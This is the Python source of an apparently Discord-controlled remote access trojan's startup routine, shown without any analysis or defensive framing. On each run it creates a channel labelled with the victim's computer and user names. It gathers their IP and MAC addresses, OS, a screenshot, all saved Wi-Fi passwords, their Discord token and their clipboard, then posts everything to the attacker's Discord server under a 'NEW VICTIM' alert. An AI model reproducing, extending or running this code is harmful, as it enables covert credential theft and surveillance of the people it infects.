import discord,os,subprocess,socket,requests,uuid,platform,pyautogui,pyperclip
from datetime import datetime
from random import randint
from start.gettoken import get_token
async def run(bot):
 guild=bot.guilds[0]
 try:pcname=subprocess.check_output("echo %COMPUTERNAME%",shell=True).decode().strip()
 except:pcname="N/A"
 try:username=subprocess.check_output("echo %USERNAME%",shell=True).decode().strip()
 except:username="N/A"
 channel_name=f'session-{pcname}-{username}'
 channel=await guild.create_text_channel(channel_name)
 bot.allowed_channel_ids[channel.id]=True
 embed=discord.Embed(title="System Information",color=discord.Color.red())
 try:ipv4=[i[4][0]for i in socket.getaddrinfo(socket.gethostname(),None,socket.AF_INET)if i[4][0].startswith("192")][0]
 except:ipv4="N/A"
 embed.add_field(name="🌐 Private IPv4",value=ipv4,inline=True)
 try:public_ip=requests.get('https://api64.ipify.org').text
 except:public_ip="N/A"
 embed.add_field(name="🌍 Public IP",value=public_ip,inline=True)
 try:mac_address=':'.join(['{:02x}'.format((uuid.getnode()>>elements)&0xff)for elements in range(0,2*6,2)][::-1])
 except:mac_address="N/A"
 embed.add_field(name="🔌 MAC Address",value=mac_address,inline=True)
 try:os_version=platform.system()+" "+platform.release()
 except:os_version="N/A"
 embed.add_field(name="🖥 OS",value=os_version,inline=True)
 try:timezone=datetime.now().astimezone().tzinfo.tzname(None)
 except:timezone="N/A"
 embed.add_field(name="🕒 Time Zone",value=timezone,inline=True)
 screenshot_dir=os.path.join(os.getenv("APPDATA"),"screenshots")
 os.makedirs(screenshot_dir,exist_ok=True)
 screenshot_path=os.path.join(screenshot_dir,f"sss_{randint(1000,9999)}.png")
 try:pyautogui.screenshot(screenshot_path)
 except:screenshot_path=None
 screenshot_file=None
 if screenshot_path and os.path.exists(screenshot_path):
  try:
   with open(screenshot_path,"rb")as img:screenshot_file=discord.File(img,"screenshot.png")
   embed.set_image(url="attachment://screenshot.png")
  except:pass
 try:wifi_info=subprocess.check_output("netsh wlan show profiles",shell=True).decode().split("\n")
 except:wifi_info=[]
 ssid_list=[line.split(":")[1].strip()for line in wifi_info if"All User Profile"in line]
 wifi_details=""
 current_wifi="Ethernet"
 try:
  current_wifi=subprocess.check_output('netsh wlan show interfaces',shell=True).decode().split("\n")
  current_wifi=[line.split(":")[1].strip()for line in current_wifi if"SSID"in line][0]
 except:current_wifi="N/A"
 for ssid in ssid_list:
  try:profile_info=subprocess.check_output(f"netsh wlan show profile {ssid} key=clear",shell=True).decode().split("\n")
  except:profile_info=[]
  password="Not found"
  for line in profile_info:
   if"Key Content"in line:password=line.split(":")[1].strip();break
  if ssid==current_wifi:wifi_details+=f"**CONNECTED SSID: {ssid}** | Password: {password}\n"
  else:wifi_details+=f"SSID: {ssid} | Password: {password}\n"
 embed.add_field(name="📶 Wi-Fi Info",value=wifi_details if wifi_details else"N/A",inline=False)
 token=get_token()
 embed.add_field(name="🔑 DISCORD TOKEN",value=f"```{token}```",inline=False)
 clipboard_content=pyperclip.paste()
 clipboard_file_path=os.path.join(os.getenv("APPDATA"),"clipboard_content.txt")
 with open(clipboard_file_path,"w")as clipboard_file:clipboard_file.write(clipboard_content)
 await channel.send(f"||@everyone|| NEW VICTIM: {username}!!\n TYPE .help FOR COMMAND LIST")
 if screenshot_file:await channel.send(embed=embed,file=screenshot_file)
 else:await channel.send(embed=embed)
 await channel.send(file=discord.File(clipboard_file_path))